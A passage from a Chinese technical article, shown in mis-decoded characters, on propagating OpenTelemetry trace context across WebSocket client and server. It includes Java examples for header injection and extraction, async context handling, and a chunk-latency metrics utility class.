<p>è¿™ç§æƒ…å½¢æ˜¯ç”Ÿäº§åº”ç”¨ä¸­æœ€æ™®éç¢°åˆ°çš„æƒ…å†µï¼Œè¦ä¿è¯ Client é“¾è·¯å’Œ Server é“¾è·¯çš„ä¸²è”ï¼Œéœ€è¦è°ƒç”¨æ–¹åœ¨å‘é€æ¶ˆæ¯æ—¶ä¿è¯æ¶ˆæ¯ä¸­æœ‰ä¸€ä¸ªç±»ä¼¼ headers çš„é¢„ç•™å­—æ®µç”¨äºä¼ é€’é“¾è·¯ä¸Šä¸‹æ–‡ï¼Œè¯¥å­—æ®µéœ€è¦è¢« Client å’Œ Server åŒæ—¶æ”¯æŒè§£æã€‚è®¸å¤šç”Ÿäº§æœåŠ¡éƒ½é¢„ç•™äº†è¿™ç±»å­—æ®µï¼Œä¾‹å¦‚ï¼šè¯­éŸ³åˆæˆCosyVoice WebSocket API#æŒ‡ä»¤ï¼ˆå®¢æˆ·ç«¯â†’æœåŠ¡ç«¯ï¼‰ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fhelp.aliyun.com%2Fzh%2Fmodel-studio%2Fcosyvoice-websocket-api%255B%23b0100c3591yqq" target="_blank" title="https://help.aliyun.com/zh/model-studio/cosyvoice-websocket-api%5B#b0100c3591yqq" ref="nofollow noopener noreferrer">help.aliyun.com/zh/model-stâ€¦</a></p>
<p>è°ƒç”¨æ–¹ä»£ç å®ç°ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">publicÂ voidÂ <span class="hljs-built_in">sendMessage</span>(StringÂ message) {
Â Â <span class="hljs-comment">// 0. ï¼ˆå¯é€‰ï¼‰å¦‚æœä¸ºä¸€ä¸ª Connection åˆ›å»ºäº† spanï¼Œéœ€è¦åœ¨æ­¤å¤„æ‰§è¡Œ span.makeCurrent()</span>
Â Â <span class="hljs-comment">// 1. åˆ›å»º header å­—æ®µ</span>
Â Â HashMap&lt;String,Â String&gt; headers =Â newÂ HashMap&lt;&gt;();
Â Â <span class="hljs-comment">// 2. åˆ›å»º span å¹¶å†™å…¥å¿…è¦çš„å±æ€§</span>
Â Â <span class="hljs-selector-tag">Span</span>Â <span class="hljs-selector-tag">span</span> = tracer<span class="hljs-selector-class">.spanBuilder</span>("Client send message")<span class="hljs-selector-class">.startSpan</span>();
Â  <span class="hljs-selector-tag">span</span><span class="hljs-selector-class">.setAttribute</span>("websocket.session.id", session.getId());
Â Â tryÂ (ScopeÂ scope = span.makeCurrent()) {
Â  Â Â <span class="hljs-comment">// 3. è°ƒç”¨ OTel APIï¼Œå°†ä¸Šä¸‹æ–‡æ³¨å…¥åˆ° header ä¸­</span>
Â  Â  openTelemetry<span class="hljs-selector-class">.getPropagators</span>()<span class="hljs-selector-class">.getTextMapPropagator</span>()<span class="hljs-selector-class">.inject</span>(Context.current(), headers,
Â  Â  Â  Â  (headersMap, key, value) -&gt; headersMap<span class="hljs-selector-class">.put</span>(key, value));
Â  Â Â <span class="hljs-comment">// 4. å‘é€æ¶ˆæ¯</span>
Â  Â Â <span class="hljs-comment">// å¦‚æœæ˜¯æµå¼å‘é€æ¶ˆæ¯ï¼Œåˆ™å¯ä»¥ä»…åœ¨ç¬¬ä¸€æ¡æ¶ˆæ¯ä¸­æ·»åŠ  headerï¼Œè°ƒç”¨åŒæ–¹éœ€è¦ä¿è¯ span åˆ›å»ºçš„å¹‚ç­‰æ€§ï¼ˆå³æ•´ä¸ªæµå¼å‘é€æœŸé—´ä»…åˆ›å»ºä¸€ä¸ª spanï¼‰</span>
Â  Â Â <span class="hljs-built_in">sendMessage</span>(message, headers);
Â  }Â finallyÂ {
Â  Â  <span class="hljs-selector-tag">span</span><span class="hljs-selector-class">.end</span>();
Â  }
}
</code></pre>
<p>è¢«è°ƒç”¨æ–¹ä»£ç å®ç°ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span>Â <span class="hljs-built_in">void</span>Â <span class="hljs-title function_">onMessage</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>Â message,Â SessionÂ session</span>) {
Â Â <span class="hljs-title class_">String</span>Â sessionId = session.<span class="hljs-title function_">getId</span>();
Â Â <span class="hljs-keyword">try</span>Â {
Â  Â Â <span class="hljs-comment">// 1. è§£ææ¶ˆæ¯</span>
Â  Â Â <span class="hljs-title class_">MessageWithHeaders</span>Â msgWithHeaders = objectMapper.<span class="hljs-title function_">readValue</span>(message,Â <span class="hljs-title class_">MessageWithHeaders</span>.<span class="hljs-property">class</span>);
Â  Â Â <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>,Â <span class="hljs-title class_">String</span>&gt; headers = msgWithHeaders.<span class="hljs-title function_">getHeaders</span>();
Â  Â Â <span class="hljs-comment">// 2. ä»æ¶ˆæ¯ä¸­æå–é“¾è·¯ä¸Šä¸‹æ–‡</span>
Â  Â Â <span class="hljs-title class_">Context</span>Â remoteContext = openTelemetry.<span class="hljs-title function_">getPropagators</span>().<span class="hljs-title function_">getTextMapPropagator</span>()
Â  Â  Â  Â  .<span class="hljs-title function_">extract</span>(<span class="hljs-title class_">Context</span>.<span class="hljs-title function_">current</span>(),
Â  Â  Â  Â  Â  Â  headers,Â <span class="hljs-keyword">new</span>Â <span class="hljs-title class_">TextMapGetter</span>&lt;<span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>,Â <span class="hljs-title class_">String</span>&gt;&gt;() {
Â  Â  Â  Â  Â  Â  Â Â <span class="hljs-meta">@Override</span>
Â  Â  Â  Â  Â  Â  Â Â <span class="hljs-keyword">public</span>Â <span class="hljs-title class_">Iterable</span>&lt;<span class="hljs-title class_">String</span>&gt;Â <span class="hljs-title function_">keys</span>(<span class="hljs-params"><span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>,Â <span class="hljs-built_in">String</span>&gt; headersMap</span>) {
Â  Â  Â  Â  Â  Â  Â  Â Â <span class="hljs-keyword">return</span>Â headersMap.<span class="hljs-title function_">keySet</span>();
Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  Â Â <span class="hljs-meta">@Override</span>
Â  Â  Â  Â  Â  Â  Â Â <span class="hljs-keyword">public</span>Â <span class="hljs-title class_">String</span>Â <span class="hljs-title function_">get</span>(<span class="hljs-params"><span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>,Â <span class="hljs-built_in">String</span>&gt; headersMap,Â <span class="hljs-built_in">String</span>Â key</span>) {
Â  Â  Â  Â  Â  Â  Â  Â Â <span class="hljs-keyword">return</span>Â headersMap.<span class="hljs-title function_">getOrDefault</span>(key,Â <span class="hljs-literal">null</span>);
Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  });
Â  Â Â <span class="hljs-comment">// 3. ä»¥æå–å‡ºæ¥çš„ä¸Šä¸‹æ–‡ä½œä¸ºçˆ¶çº§ï¼Œåˆ›å»º Server span</span>
Â  Â Â <span class="hljs-title class_">Span</span>Â serverSpan = tracer.<span class="hljs-title function_">spanBuilder</span>(<span class="hljs-string">"Server handle message"</span>)
Â  Â  Â  Â  .<span class="hljs-title function_">setParent</span>(remoteContext).<span class="hljs-title function_">startSpan</span>();
Â  Â Â <span class="hljs-keyword">try</span>Â (<span class="hljs-title class_">Scope</span>Â scope = serverSpan.<span class="hljs-title function_">makeCurrent</span>()) {
Â  Â  Â Â <span class="hljs-comment">// 4. å¤„ç†æ¶ˆæ¯/æµå¼è¿”å›å“åº”</span>
Â  Â  Â Â <span class="hljs-title class_">String</span>Â body = msgWithHeaders.<span class="hljs-title function_">getBody</span>();
Â  Â  Â  log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"æ”¶åˆ°æ¶ˆæ¯ [{}] [headers={}]: {}"</span>, sessionId, headers, body);
Â  Â  Â Â <span class="hljs-comment">// å¤„ç†æ¶ˆæ¯ï¼ˆå¸¦ headersï¼‰</span>
Â  Â  Â Â <span class="hljs-title function_">handleMessage</span>(session, body, headers);
Â  Â  }Â <span class="hljs-keyword">catch</span>Â (<span class="hljs-title class_">Exception</span>Â e) {
Â  Â  Â  serverSpan.<span class="hljs-title function_">recordException</span>(e);
Â  Â  }Â <span class="hljs-keyword">finally</span>Â {
Â  Â  Â  serverSpan.<span class="hljs-title function_">end</span>();
Â  Â  }
Â  }Â <span class="hljs-keyword">catch</span>Â (<span class="hljs-title class_">Exception</span>Â e) {
Â  Â  log.<span class="hljs-title function_">error</span>(<span class="hljs-string">"æ¶ˆæ¯æ¥æ”¶å¤±è´¥ [{}]: {}"</span>, sessionId, message, e);
Â  }
}
</code></pre>
<h4 data-id="heading-23">3.2.5 è°ƒç”¨å»ºæ¨¡é—®é¢˜â€”â€”æ— æ˜¾å¼è°ƒç”¨å…³ç³»ï¼Œä»…ä¼ è¾“æ•°æ®</h4>
<p><strong>å®ç°å»ºè®®ï¼š</strong> æ•°æ®å‘é€æ–¹åˆ›å»º Spanï¼Œä½œä¸ºæ•´ä¸ª WebSocket è¿æ¥ Spanï¼ˆå¦‚æœ‰ï¼‰çš„å­ Spanï¼ŒåŒæ–¹ Span ä¸ç»´æŒçˆ¶å­å…³ç³»ã€‚</p>
<p>é“¾è·¯æ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f36d0163e58b49f19fa6afe419ffd57d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394855&amp;x-signature=BUKxDgBS8ScFsshQ7BwRqJjQ5%2FM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ•°æ®å‘é€æ–¹ä»£ç ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">publicÂ voidÂ <span class="hljs-built_in">streamingSendMessages</span>(Session session)Â {
Â Â <span class="hljs-comment">// 0. ï¼ˆå¯é€‰ï¼‰å¦‚æœä¸ºä¸€ä¸ª Connection åˆ›å»ºäº† spanï¼Œéœ€è¦åœ¨æ­¤å¤„æ‰§è¡Œ span.makeCurrent()</span>
Â Â ContextÂ contextÂ =Â connectionTraceContexts<span class="hljs-selector-class">.containsKey</span>(session.getId()) ?
Â  Â  Â  Â  Â  Â  connectionTraceContexts<span class="hljs-selector-class">.get</span>(session.getId()) : Context.<span class="hljs-built_in">current</span>();
Â Â tryÂ (ScopeÂ pScopeÂ =Â context.makeCurrent()) {
Â  Â Â <span class="hljs-comment">// 1. åˆ›å»º Span</span>
Â  Â Â <span class="hljs-selector-tag">Span</span>Â <span class="hljs-selector-tag">span</span>Â =Â tracer<span class="hljs-selector-class">.spanBuilder</span>("Client send message")<span class="hljs-selector-class">.setParent</span>(context)<span class="hljs-selector-class">.startSpan</span>();
Â  Â  <span class="hljs-selector-tag">span</span><span class="hljs-selector-class">.setAttribute</span>("websocket.session.id", session.getId());
Â  Â Â tryÂ (ScopeÂ scopeÂ =Â span.makeCurrent()) {
Â  Â  Â Â <span class="hljs-comment">// 2. å‘é€æ¶ˆæ¯</span>
Â  Â  Â Â whileÂ (messageQueue !=Â nullÂ &amp;&amp; messageQueue.containsKey(session.getId())) {
Â  Â  Â  Â  List&lt;Message&gt; messages = messageQueue<span class="hljs-selector-class">.get</span>(session.getId());
Â  Â  Â  Â  messages<span class="hljs-selector-class">.forEach</span>(message -&gt; sendMessage(session, message));
Â  Â  Â  Â  Thread<span class="hljs-selector-class">.sleep</span>(<span class="hljs-number">200</span>L);
Â  Â  Â  }
Â  Â  }Â finallyÂ {
Â  Â  Â  <span class="hljs-selector-tag">span</span><span class="hljs-selector-class">.end</span>();
Â  Â  }
Â  }
}
</code></pre>
<h4 data-id="heading-24">3.2.6 å¼‚æ­¥é€ä¼ é—®é¢˜â€”â€”è¿›ç¨‹å†…å¼‚æ­¥ä¸Šä¸‹æ–‡ç®¡ç†</h4>
<p>ä¸€èˆ¬åœ°ï¼Œåœ¨ WebSocket åº”ç”¨ä¸­çš„å¼‚æ­¥å­˜åœ¨ä¸¤ç§å®ç°ï¼š</p>
<ul>
<li>åŸºäºçº¿ç¨‹æ± çš„å¼‚æ­¥è°ƒåº¦ï¼Œæ¯å½“æ¥æ”¶åˆ°æ¶ˆæ¯ï¼Œéƒ½åˆ›å»ºä¸€ä¸ª Runnable æˆ– Callableï¼Œæˆ–è€…åˆ›å»ºä¸€ä¸ª Golang/Python åç¨‹</li>
<li>åŸºäºè¿›ç¨‹å†…é˜Ÿåˆ—è¿›è¡Œå¼‚æ­¥é€šä¿¡ï¼ˆå¦‚ Java çš„ Dequeã€Golang çš„ Channelã€Python çš„ Generator ç­‰ï¼‰ï¼Œæ¯å½“æ¥æ”¶åˆ°æ¶ˆæ¯éƒ½å…¥é˜Ÿï¼Œç”±ç»Ÿä¸€çš„ Worker è¿›è¡Œå¤„ç†</li>
</ul>
<p>å¯¹äºç¬¬ä¸€ç§æƒ…å½¢ï¼ŒLoongSuite æ¢é’ˆå·²ç»æ”¯æŒä¸Šä¸‹æ–‡çš„è‡ªåŠ¨é€ä¼ ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">publicÂ voidÂ <span class="hljs-built_in">onMessage</span>(String message)Â {
Â Â <span class="hljs-selector-tag">Span</span>Â messageSpanÂ =Â tracer<span class="hljs-selector-class">.spanBuilder</span>("Server handle message")<span class="hljs-selector-class">.startSpan</span>();
Â Â <span class="hljs-comment">// æŠŠå½“å‰ span æ¿€æ´»å¹¶æ”¾åˆ° ThreadLocal ä¸­</span>
Â Â tryÂ (ScopeÂ scopeÂ =Â messageSpan.makeCurrent()) {
Â  Â Â <span class="hljs-comment">// å¼‚æ­¥è°ƒç”¨æ¶ˆæ¯å¤„ç†æµç¨‹</span>
Â  Â Â <span class="hljs-comment">// æ¢é’ˆä¼šåœ¨ Runnable ä»»åŠ¡è¢«åˆ›å»ºæ—¶ï¼Œå°† span æ‰€åœ¨ä¸Šä¸‹æ–‡è‡ªåŠ¨ä¼ é€’åˆ° doHandleMessage æ–¹æ³•å†…éƒ¨</span>
Â  Â Â <span class="hljs-comment">// doHandleMessage æ–¹æ³•å®é™…æ‰§è¡Œæ—¶ï¼Œä¸Šä¸‹æ–‡ä¼šè¢«è‡ªåŠ¨å¤åŸ</span>
Â  Â  workerExecutor<span class="hljs-selector-class">.execute</span>(() -&gt; <span class="hljs-built_in">doHandleMessage</span>(message));
Â  }
}
</code></pre>
<p>å¯¹äºç¬¬äºŒç§æƒ…å½¢ï¼Œéœ€è¦ä½¿ç”¨è€…ä¸»åŠ¨è¿›è¡Œä¸Šä¸‹æ–‡é€ä¼ å’Œè¿˜åŸï¼š</p>
<pre><code class="hljs language-scss" lang="scss">publicÂ voidÂ <span class="hljs-built_in">onMessage</span>(String message)Â {
Â Â <span class="hljs-selector-tag">Span</span>Â messageSpanÂ =Â tracer<span class="hljs-selector-class">.spanBuilder</span>("Server handle message")<span class="hljs-selector-class">.startSpan</span>();
Â Â <span class="hljs-comment">// æŠŠå½“å‰ span æ¿€æ´»å¹¶æ”¾åˆ° ThreadLocal ä¸­</span>
Â Â tryÂ (ScopeÂ scopeÂ =Â messageSpan.makeCurrent()) {
Â  Â Â <span class="hljs-comment">// æ‰‹åŠ¨å°† TraceContext ä¸ Message å…³è”ï¼ˆä¹Ÿå¯ä»¥é€šè¿‡ Mapï¼‰</span>
Â  Â  message<span class="hljs-selector-class">.setTracingContext</span>(Context.current());
Â  Â Â <span class="hljs-comment">// æ¶ˆæ¯å…¥é˜Ÿ</span>
Â  Â  messageQueue<span class="hljs-selector-class">.offer</span>(message);
Â  }
}
publicÂ voidÂ <span class="hljs-built_in">pollAndHandleMessage</span>()Â {
Â Â whileÂ (true) {
Â  Â Â ifÂ (!messageQueue.isEmpty) {
Â  Â  Â Â MessageÂ messageÂ =Â messageQueue<span class="hljs-selector-class">.poll</span>();
Â  Â  Â Â <span class="hljs-comment">// æ¶ˆæ¯å‡ºé˜Ÿåï¼Œè·å– TraceContext ä¸ Span</span>
Â  Â  Â Â ContextÂ tracingContextÂ =Â message<span class="hljs-selector-class">.getTracingContext</span>();
Â  Â  Â Â <span class="hljs-selector-tag">Span</span>Â <span class="hljs-selector-tag">span</span>Â =Â <span class="hljs-selector-tag">Span</span><span class="hljs-selector-class">.fromContext</span>(tracingContext);
Â  Â  Â Â <span class="hljs-comment">// å°† TraceContext é‡æ–°æ¿€æ´»å¹¶æ”¾åˆ° ThreadLocal ä¸­</span>
Â  Â  Â Â tryÂ (ScopeÂ scopeÂ =Â tracingContext.makeCurrent()) {
Â  Â  Â  Â  <span class="hljs-built_in">handleMessage</span>(message);
Â  Â  Â  }Â finallyÂ {
Â  Â  Â  Â Â <span class="hljs-comment">// æ¶ˆæ¯å¤„ç†ç»“æŸï¼Œå…³é—­ span</span>
Â  Â  Â  Â  <span class="hljs-selector-tag">span</span><span class="hljs-selector-class">.end</span>();
Â  Â  Â  }
Â  Â  }
Â  Â  Thread<span class="hljs-selector-class">.sleep</span>(<span class="hljs-number">100</span>L);
Â  }
}
</code></pre>
<h3 data-id="heading-25">3.3 WebSocket ä¸­æµå¼ä¼ è¾“çš„å…³é”®ä¸šåŠ¡æŒ‡æ ‡</h3>
<p>åœ¨ 3.2 èŠ‚ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨æµå¼ä¼ è¾“çš„åœºæ™¯ä¸‹ï¼Œæˆ‘ä»¬ä¼šæŠŠä¸€æ¬¡å®Œæ•´çš„è¯·æ±‚è®°å½•ä¸ºä¸€æ¡ Spanï¼Œä»¥é˜²æ­¢è¿‡å¤š Span å¯¼è‡´æ€§èƒ½ç“¶é¢ˆã€‚ä½†è¿™ä¹Ÿä¼šæŠ¹å»æµå¼ä¼ è¾“ä¸­çš„ä¸€äº›å…³é”®æ€§èƒ½ä¿¡æ¯â€”â€”ä¸€æ¬¡æ¶ˆæ¯å¤„ç†ä¸­ï¼ŒæŸäº›ä¸ªåˆ«çš„æ•°æ®åŒ…å¤„ç†æ—¶é•¿è¿‡é•¿å¼•å‘æ•´ä¸ªå“åº”è¿‡ç¨‹åæ…¢ã€‚å®é™…ç”Ÿäº§ä¸­ï¼Œè¿™äº›æŒ‡æ ‡ä¹Ÿèƒ½å¾ˆå¤§ç¨‹åº¦ä¸Šå¸®æˆ‘ä»¬è¡¡é‡åº”ç”¨çš„å¥åº·åº¦ä¸è¯„ä¼°æŸäº›é“¾è·¯çš„é—®é¢˜æ‰€åœ¨ï¼Œä»¥ä¸‹æ˜¯å‡ ä¸ªå¸¸ç”¨çš„ä¸šåŠ¡æŒ‡æ ‡ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9b4f17d11e0f4280beca8b9dfecb5224~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394855&amp;x-signature=pzkdagqWySUY5WnMeVnQaz1D6rw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä»¥ä¸‹æ˜¯è®¡ç®—è¿™äº›æŒ‡æ ‡çš„ä¸€ä¸ªç®€å•çš„å·¥å…·ç±»å®ç°ï¼Œå…³äºè¯¦ç»†çš„ä½¿ç”¨æ–¹å¼ï¼Œæ¬¢è¿æŸ¥çœ‹ç¤ºä¾‹ä»£ç ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FCirilla-zmh%2Fasr-demo%2Fblob%2Fmain%2Fasr-service%2Fsrc%2Fmain%2Fjava%2Fcom%2Fexample%2Fasr%2Fws%2FAsrWebSocketHandler.java" target="_blank" title="https://github.com/Cirilla-zmh/asr-demo/blob/main/asr-service/src/main/java/com/example/asr/ws/AsrWebSocketHandler.java" ref="nofollow noopener noreferrer">github.com/Cirilla-zmhâ€¦</a></p>
<p>å·¥å…·ç±»å®šä¹‰</p>
<pre><code class="hljs language-ini" lang="ini">publicÂ classÂ WebSocketPerformanceMeasureÂ {
Â Â privateÂ staticÂ final Logger <span class="hljs-attr">log</span> = LoggerFactory.getLogger(WebSocketPerformanceMeasure.class)<span class="hljs-comment">;</span>
Â Â privateÂ staticÂ finalÂ longÂ <span class="hljs-attr">UNINITIALIZED</span> =Â -<span class="hljs-number">1</span>L<span class="hljs-comment">;</span>
Â Â privateÂ Long startTime<span class="hljs-comment">;</span>
Â Â privateÂ Long firstChunkTime<span class="hljs-comment">;</span>
Â Â privateÂ AtomicInteger chunkCounts<span class="hljs-comment">;</span>
Â Â privateÂ AtomicLong totalInterval<span class="hljs-comment">;</span>
Â Â privateÂ Long lastChunkTime<span class="hljs-comment">;</span>
Â Â publicÂ staticÂ WebSocketPerformanceMeasureÂ create()Â {
Â  Â  WebSocketPerformanceMeasure <span class="hljs-attr">measure</span> =Â newÂ WebSocketPerformanceMeasure()<span class="hljs-comment">;</span>
Â  Â  <span class="hljs-attr">measure.startTime</span> = System.currentTimeMillis()<span class="hljs-comment">;</span>
Â  Â  <span class="hljs-attr">measure.firstChunkTime</span> = UNINITIALIZED<span class="hljs-comment">;</span>
Â  Â  <span class="hljs-attr">measure.chunkCounts</span> =Â newÂ AtomicInteger(<span class="hljs-number">0</span>)<span class="hljs-comment">;</span>
Â  Â  <span class="hljs-attr">measure.totalInterval</span> =Â newÂ AtomicLong(<span class="hljs-number">0</span>)<span class="hljs-comment">;</span>
Â  Â  <span class="hljs-attr">measure.lastChunkTime</span> = UNINITIALIZED<span class="hljs-comment">;</span>
Â  Â Â returnÂ measure<span class="hljs-comment">;</span>
Â  }
Â Â /**
Â  Â * å¼€å§‹æµ‹é‡ï¼ˆå¦‚æœå°šæœªå¼€å§‹ï¼‰
Â  Â */
Â Â publicÂ voidÂ start()Â {
Â  Â Â ifÂ (<span class="hljs-attr">startTime</span> ==Â null) {
Â  Â  Â  <span class="hljs-attr">startTime</span> = System.currentTimeMillis()<span class="hljs-comment">;</span>
Â  Â  Â  <span class="hljs-attr">firstChunkTime</span> = UNINITIALIZED<span class="hljs-comment">;</span>
Â  Â  Â  <span class="hljs-attr">chunkCounts</span> =Â newÂ AtomicInteger(<span class="hljs-number">0</span>)<span class="hljs-comment">;</span>
Â  Â  Â  <span class="hljs-attr">totalInterval</span> =Â newÂ AtomicLong(<span class="hljs-number">0</span>)<span class="hljs-comment">;</span>
Â  Â  Â  <span class="hljs-attr">lastChunkTime</span> = UNINITIALIZED<span class="hljs-comment">;</span>
Â  Â  }
Â  }
Â Â /**
Â  Â * è®°å½•ä¸€ä¸ª chunk çš„åˆ°è¾¾
Â  Â * è‡ªåŠ¨è®¡ç®— time_to_first_chunk å’Œæ›´æ–°é—´éš”ç»Ÿè®¡
Â  Â *Â 
Â  Â * @return å¦‚æœæ˜¯ç¬¬ä¸€ä¸ª chunkï¼Œè¿”å› time_to_first_chunkï¼ˆæ¯«ç§’ï¼‰ï¼Œå¦åˆ™è¿”å› null
Â  Â */
Â Â publicÂ LongÂ recordChunk()Â {
Â  Â Â ifÂ (<span class="hljs-attr">startTime</span> ==Â null) {
Â  Â  Â  log.warn("Performance measure not started, calling start() automatically")<span class="hljs-comment">;</span>
Â  Â  Â  start()<span class="hljs-comment">;</span>
Â  Â  }
Â  Â Â longÂ <span class="hljs-attr">currentTime</span> = System.currentTimeMillis()<span class="hljs-comment">;</span>
Â  Â  chunkCounts.incrementAndGet()<span class="hljs-comment">;</span>
Â  Â Â // è®°å½•ç¬¬ä¸€ä¸ª chunk çš„æ—¶é—´
Â  Â  Long <span class="hljs-attr">timeToFirstChunk</span> =Â null<span class="hljs-comment">;</span>
Â  Â Â ifÂ (<span class="hljs-attr">firstChunkTime</span> == UNINITIALIZED) {
Â  Â  Â  <span class="hljs-attr">timeToFirstChunk</span> = currentTime - startTime<span class="hljs-comment">;</span>
Â  Â  Â  <span class="hljs-attr">firstChunkTime</span> = currentTime<span class="hljs-comment">;</span>
Â  Â  Â  log.debug("First chunk recorded, time_to_first_chunk: {}ms", timeToFirstChunk)<span class="hljs-comment">;</span>
Â  Â  }
Â  Â Â // è®¡ç®— chunk é—´éš”ï¼ˆä»ç¬¬äºŒä¸ª chunk å¼€å§‹ï¼‰
Â  Â Â ifÂ (lastChunkTime != UNINITIALIZED) {
Â  Â  Â Â longÂ <span class="hljs-attr">interval</span> = currentTime - lastChunkTime<span class="hljs-comment">;</span>
Â  Â  Â  totalInterval.addAndGet(interval)<span class="hljs-comment">;</span>
Â  Â  }
Â  Â  <span class="hljs-attr">lastChunkTime</span> = currentTime<span class="hljs-comment">;</span>
Â  Â Â returnÂ timeToFirstChunk<span class="hljs-comment">;</span>
Â  }
Â Â /**
Â  Â * è·å– time_to_first_chunkï¼ˆæ¯«ç§’ï¼‰
Â  Â * å¦‚æœç¬¬ä¸€ä¸ª chunk å°šæœªåˆ°è¾¾ï¼Œè¿”å› null
Â  Â */
Â Â publicÂ LongÂ getTimeToFirstChunk()Â {
Â  Â Â ifÂ (<span class="hljs-attr">firstChunkTime</span> == UNINITIALIZED || startTime ==Â null) {
Â  Â  Â Â returnÂ null<span class="hljs-comment">;</span>
Â  Â  }
Â  Â Â returnÂ firstChunkTime - startTime<span class="hljs-comment">;</span>
Â  }
Â Â /**
Â  Â * è·å– time_to_last_chunkï¼ˆæ¯«ç§’ï¼‰
Â  Â * éœ€è¦ä¿è¯åœ¨ chunk å®Œå…¨åˆ°è¾¾åè°ƒç”¨
Â  Â * å¦‚æœç¬¬ä¸€ä¸ª chunk å°šæœªåˆ°è¾¾ï¼Œè¿”å› null
Â  Â */
Â Â publicÂ LongÂ getTimeToLastChunk()Â {
Â  Â Â ifÂ (<span class="hljs-attr">lastChunkTime</span> == UNINITIALIZED || startTime ==Â null) {
Â  Â  Â Â returnÂ null<span class="hljs-comment">;</span>
Â  Â  }
Â  Â Â returnÂ lastChunkTime - startTime<span class="hljs-comment">;</span>
Â  }
Â Â /**
Â  Â * è·å–å¹³å‡ chunk é—´éš”ï¼ˆæ¯«ç§’ï¼‰
Â  Â * å¦‚æœ chunk æ•°é‡å°‘äº 2ï¼Œè¿”å› null
Â  Â */
Â Â publicÂ LongÂ getAverageInterval()Â {
Â  Â Â intÂ <span class="hljs-attr">count</span> = chunkCounts.get()<span class="hljs-comment">;</span>
Â  Â Â ifÂ (count &lt;Â 2Â || <span class="hljs-attr">totalInterval</span> ==Â null) {
Â  Â  Â Â returnÂ null<span class="hljs-comment">;</span>
Â  Â  }
Â  Â Â returnÂ totalInterval.get() / (count -Â 1)<span class="hljs-comment">;</span>
Â  }
Â Â /**
Â  Â * è·å– chunk æ€»æ•°
Â  Â */
Â Â publicÂ intÂ getChunkCount()Â {
Â  Â Â returnÂ chunkCounts !=Â nullÂ ? chunkCounts.get() :Â 0<span class="hljs-comment">;</span>
Â  }
}
</code></pre>
<h2 data-id="heading-26">å…¸å‹åœºæ™¯å®è·µï¼šAI è¯­éŸ³å¯¹è¯ç³»ç»Ÿ</h2>
<p>æœ¬èŠ‚æˆ‘ä»¬å°†ç»“åˆä¸€ä¸ªç”Ÿäº§ä¸­å¸¸è§çš„ä¸šåŠ¡ç³»ç»Ÿï¼Œæ¥ç®€è¦ä»‹ç»æœ¬æ–‡æ–¹æ¡ˆåœ¨è¯¥åœºæ™¯ä¸‹çš„å…·ä½“å®è·µã€‚ç›¸å…³ demo ä»£ç å·²å¼€æºï¼Œæ¬¢è¿ç§»æ­¥Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FCirilla-zmh%2Fasr-demo%25C2%25A0%25E5%25AE%259E%25E8%25B7%25B5%25E3%2580%2582" target="_blank" title="https://github.com/Cirilla-zmh/asr-demo%C2%A0%E5%AE%9E%E8%B7%B5%E3%80%82" ref="nofollow noopener noreferrer">github.com/Cirilla-zmhâ€¦</a></p>
<h3 data-id="heading-27">4.1 ç³»ç»Ÿæ¶æ„è§£æ</h3>
<p>ä»¥ä¸‹æ˜¯ç³»ç»Ÿæ•´ä½“æ¶æ„çš„ç®€å•ç¤ºæ„ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">è®¾å¤‡ç«¯ â†’ WebSocket â†’ ASR â†’ <span class="hljs-built_in">LLM</span>(æ„å›¾è¯†åˆ«) â†“
â”œâ”€ é—²èŠ â†’ <span class="hljs-built_in">LLM</span>(ç”Ÿæˆ) â†’ TTS â†’ è®¾å¤‡ç«¯
â””â”€ ä¸‹å• â†’ <span class="hljs-built_in">MCP</span>(ä¸‹å•) â†’ <span class="hljs-built_in">LLM</span>(ç”Ÿæˆ) â†’ TTS â†’ è®¾å¤‡ç«¯
</code></pre>
<p>è°ƒç”¨æ—¶åºå›¾ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55cc7b8d26324cb9982d1ff6557e7739~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394855&amp;x-signature=4dDIWtu837Ut3S4ADlWodJ9LtKM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-28">4.2 æ¥å…¥ LoongSuite æ¢é’ˆ</h3>
